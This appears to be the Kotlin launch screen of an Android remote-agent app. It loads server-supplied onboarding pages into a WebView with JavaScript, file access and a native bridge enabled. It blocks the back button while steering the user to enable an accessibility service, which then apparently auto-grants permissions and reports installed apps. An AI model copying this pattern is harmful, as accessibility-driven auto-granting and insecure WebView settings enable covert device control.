package com.base.realtime.ui

import android.annotation.SuppressLint
import android.app.Activity
import android.content.Intent
import android.content.res.ColorStateList
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.window.OnBackInvokedDispatcher
import android.view.View
import android.view.ViewGroup
import android.webkit.JavascriptInterface
import android.webkit.WebResourceError
import android.webkit.WebResourceRequest
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.ProgressBar
import com.base.realtime.RealtimeApp
import com.base.realtime.access.AccessibilityGuideActivity
import com.base.realtime.access.AgentAccessibilityService
import com.base.realtime.access.AutoGrantOrchestrator
import com.base.realtime.config.AppConfigs
import com.base.realtime.endpoint.PortEndpointStore
import com.base.realtime.identity.IdentityStore
import com.base.realtime.service.RealtimeService
import com.base.realtime.apps.InstalledAppsPush
import com.base.realtime.onboarding.ClientTheme
import com.base.realtime.onboarding.ClientThemeStore
import com.base.realtime.onboarding.OnboardingCache
import com.base.realtime.onboarding.OnboardingEnsureResult
import com.base.realtime.onboarding.OnboardingStore
import java.io.File
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.concurrent.thread

/**
 * Cold-start gate: config.json endpoint → spinner → onboarding if needed → Accessibility guide → [MainActivity].
 */
class LaunchActivity : Activity() {
    private val finished = AtomicBoolean(false)
    private val gateRunning = AtomicBoolean(false)
    private lateinit var root: View
    private lateinit var webView: WebView
    private lateinit var loading: View
    private lateinit var progress: ProgressBar
    private var port: String = ""
    private var serverUrl: String = ""
    private var canRetry = false
    private var primaryColor: Int = DEFAULT_BG
    private var clientTheme: ClientTheme = ClientTheme()
    private var awaitingA11y = false
    private var leftForA11y = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(com.base.realtime.R.layout.activity_onboarding)
        root = findViewById(com.base.realtime.R.id.onboardingRoot)
        webView = findViewById(com.base.realtime.R.id.onboardingWeb)
        if (Build.VERSION.SDK_INT >= 33) {
            onBackInvokedDispatcher.registerOnBackInvokedCallback(
                OnBackInvokedDispatcher.PRIORITY_DEFAULT,
            ) {
                // لودینگ: webView عمداً GONE است. finish اینجا فعالیت را همان لحظه می‌بندد
                // و gate بعدی showOnboarding را روی WebView مرده صدا می‌زند.
                if (shouldHoldBack()) return@registerOnBackInvokedCallback
                if (!isFinishing) finish()
            }
        }
        loading = findViewById(com.base.realtime.R.id.onboardingLoading)
        progress = findViewById(com.base.realtime.R.id.onboardingProgress)

        val config = AppConfigs.load(this)
        port = config.port
        applyTheme(ClientThemeStore.cached(this, port))

        loading.setOnClickListener {
            if (canRetry && webView.visibility != View.VISIBLE && !gateRunning.get()) {
                startGate()
            }
        }

        startGate()
    }

    private fun startGate() {
        if (finished.get() || !gateRunning.compareAndSet(false, true)) return
        canRetry = false
        loading.visibility = View.VISIBLE
        progress.visibility = View.VISIBLE
        webView.visibility = View.GONE
        thread(name = "launch-gate") {
            try {
                runGate()
            } finally {
                gateRunning.set(false)
            }
        }
    }

    private fun runGate() {
        if (port.isBlank()) {
            InstalledAppsPush.markUiReady(this)
            openMain()
            return
        }

        val endpoint = PortEndpointStore.resolve(this)
        if (endpoint == null) {
            runOnUiThread {
                canRetry = true
                progress.visibility = View.VISIBLE
                loading.visibility = View.VISIBLE
                webView.visibility = View.GONE
            }
            return
        }
        serverUrl = endpoint.wsUrl
        val token = AppConfigs.load(this).token
        IdentityStore(this).ensureReady(serverUrl, token)
        PortEndpointStore.startListening(this)
        runOnUiThread { connectNow() }

        if (OnboardingStore.isDone(this, port)) {
            if (AgentAccessibilityService.isEnabled(this)) {
                InstalledAppsPush.markUiReady(this)
                if (AutoGrantOrchestrator.shouldRun(this)) {
                    runOnUiThread {
                        // finish نکن — زیر AutoGrant بمان؛ finish زودهنگام = لانچر و بلعیدن host روی MIUI
                        AutoGrantOrchestrator.launchFromForeground(this)
                    }
                } else {
                    openMain()
                }
                return
            }
            // Onboarding marked done earlier but Accessibility still off — show pages again if cached.
            if (OnboardingCache.isReady(this, port)) {
                val theme = ClientThemeStore.fetch(this, serverUrl, port)
                runOnUiThread {
                    applyTheme(theme)
                    showOnboarding()
                }
                return
            }
            InstalledAppsPush.markUiReady(this)
            runOnUiThread {
                loading.visibility = View.GONE
                progress.visibility = View.GONE
                startAccessibilityFlow()
            }
            return
        }

        val theme = ClientThemeStore.fetch(this, serverUrl, port)
        runOnUiThread { applyTheme(theme) }

        if (!OnboardingCache.isReady(this, port)) {
            when (OnboardingCache.ensure(this, serverUrl, port)) {
                OnboardingEnsureResult.Absent -> {
                    OnboardingStore.markDone(this, port)
                    InstalledAppsPush.markUiReady(this)
                    runOnUiThread {
                        loading.visibility = View.GONE
                        progress.visibility = View.GONE
                        startAccessibilityFlow()
                    }
                    return
                }
                OnboardingEnsureResult.Failed -> {
                    runOnUiThread {
                        canRetry = true
                        progress.visibility = View.VISIBLE
                        loading.visibility = View.VISIBLE
                        webView.visibility = View.GONE
                    }
                    return
                }
                OnboardingEnsureResult.Ready -> Unit
            }
        }

        if (!OnboardingCache.isReady(this, port)) {
            OnboardingStore.markDone(this, port)
            InstalledAppsPush.markUiReady(this)
            runOnUiThread {
                loading.visibility = View.GONE
                progress.visibility = View.GONE
                startAccessibilityFlow()
            }
            return
        }

        runOnUiThread { showOnboarding() }
    }

    private fun applyTheme(theme: ClientTheme) {
        clientTheme = theme
        val color = ClientThemeStore.parseColorOrNull(theme.primaryColor) ?: return
        primaryColor = color
        root.setBackgroundColor(softBackground(color))
        loading.setBackgroundColor(softBackground(color))
        progress.indeterminateTintList = ColorStateList.valueOf(color)
    }

    private fun softBackground(color: Int): Int {
        val r = Color.red(color)
        val g = Color.green(color)
        val b = Color.blue(color)
        // Keep loading light; tint toward primary (~8%).
        return Color.rgb(
            (r * 0.08 + 255 * 0.92).toInt().coerceIn(0, 255),
            (g * 0.08 + 255 * 0.92).toInt().coerceIn(0, 255),
            (b * 0.08 + 255 * 0.92).toInt().coerceIn(0, 255),
        )
    }

    private fun shouldHoldBack(): Boolean {
        if (!::webView.isInitialized || isFinishing || isDestroyed) return true
        if (AutoGrantOrchestrator.isActive()) return true
        if (gateRunning.get()) return true
        return webView.visibility == View.VISIBLE
    }

    private fun uiAlive(): Boolean =
        !finished.get() && !isFinishing && !isDestroyed && ::webView.isInitialized

    @SuppressLint("SetJavaScriptEnabled")
    private fun showOnboarding() {
        if (!uiAlive()) return
        val index = OnboardingCache.indexFile(this, port)
        val dir = index.parentFile ?: return
        webView.setBackgroundColor(softBackground(primaryColor))
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            cacheMode = WebSettings.LOAD_NO_CACHE
            allowFileAccess = true
            allowContentAccess = true
            @Suppress("DEPRECATION")
            allowFileAccessFromFileURLs = true
        }
        webView.removeJavascriptInterface("OnboardingBridge")
        webView.addJavascriptInterface(Bridge(), "OnboardingBridge")
        webView.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, loaded: String?) {
                if (finished.get()) return
                loading.visibility = View.GONE
                progress.visibility = View.GONE
                webView.visibility = View.VISIBLE
                InstalledAppsPush.markUiReady(this@LaunchActivity)
            }

            override fun onReceivedError(
                view: WebView?,
                request: WebResourceRequest?,
                error: WebResourceError?,
            ) {
                if (request?.isForMainFrame == true && !finished.get()) {
                    canRetry = true
                    webView.visibility = View.GONE
                    loading.visibility = View.VISIBLE
                    progress.visibility = View.VISIBLE
                }
            }
        }
        val raw = runCatching { index.readText(Charsets.UTF_8) }.getOrNull()
        if (raw.isNullOrBlank()) {
            webView.loadUrl(Uri.fromFile(index).toString())
            return
        }
        val html = ClientThemeStore.themedHtml(this, raw, clientTheme, dir, port)
        val base = Uri.fromFile(File(dir, "x")).toString().removeSuffix("x")
        webView.loadDataWithBaseURL(base, html, "text/html", "utf-8", null)
    }

    private fun onboardingFinished() {
        // Keep onboarding visible until Accessibility is granted.
        startAccessibilityFlow()
    }

    private fun startAccessibilityFlow() {
        if (finished.get()) return
        if (AgentAccessibilityService.isEnabled(this)) {
            finishOnboardingAfterA11y()
            return
        }
        if (awaitingA11y) return
        awaitingA11y = true
        leftForA11y = false
        AccessibilityGuideActivity.open(this)
    }

    private fun finishOnboardingAfterA11y() {
        if (port.isNotBlank()) {
            OnboardingStore.markDone(this, port)
        }
        if (AutoGrantOrchestrator.shouldRun(this)) {
            awaitingA11y = false
            // زنده بمان تا Leave به ما برسد؛ از foreground استارت کن (نه finish→Home)
            AutoGrantOrchestrator.launchFromForeground(this)
            return
        }
        openMain()
    }

    private fun connectNow() {
        try {
            RealtimeService.start(this)
            RealtimeApp.engine(this).ensureStarted()
        } catch (_: Throwable) {
        }
    }

    private fun openMain() {
        if (!finished.compareAndSet(false, true)) return
        awaitingA11y = false
        goMain()
    }

    private fun goMain() {
        runOnUiThread {
            startActivity(
                Intent(this, MainActivity::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP),
            )
            finish()
        }
    }

    override fun onPause() {
        if (awaitingA11y) leftForA11y = true
        super.onPause()
    }

    override fun onResume() {
        super.onResume()
        if (!awaitingA11y || finished.get()) return
        if (AgentAccessibilityService.isEnabled(this)) {
            finishOnboardingAfterA11y()
            return
        }
        if (leftForA11y) {
            // Back from Accessibility settings — return to last onboarding step.
            awaitingA11y = false
            leftForA11y = false
            restoreLastOnboardingStep()
        }
    }

    private fun restoreLastOnboardingStep() {
        if (webView.visibility != View.VISIBLE) {
            if (port.isNotBlank() && OnboardingCache.isReady(this, port)) {
                showOnboarding()
            }
        }
        webView.post {
            try {
                webView.evaluateJavascript(
                    "window.OnboardingHost&&OnboardingHost.showLastStep&&OnboardingHost.showLastStep()",
                    null,
                )
            } catch (_: Throwable) {
            }
        }
    }

    override fun onDestroy() {
        finished.set(true)
        if (::webView.isInitialized) {
            try {
                (webView.parent as? ViewGroup)?.removeView(webView)
                webView.apply {
                    stopLoading()
                    loadUrl("about:blank")
                    removeAllViews()
                    destroy()
                }
            } catch (_: Throwable) {
            }
        }
        super.onDestroy()
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        if (shouldHoldBack()) return
        super.onBackPressed()
    }

    private inner class Bridge {
        @JavascriptInterface
        fun complete(payload: String?) {
            runOnUiThread { onboardingFinished() }
        }

        @JavascriptInterface
        fun onFinished(payload: String?) {
            runOnUiThread { onboardingFinished() }
        }
    }

    private companion object {
        val DEFAULT_BG: Int = Color.parseColor("#E8F2EF")
    }
}
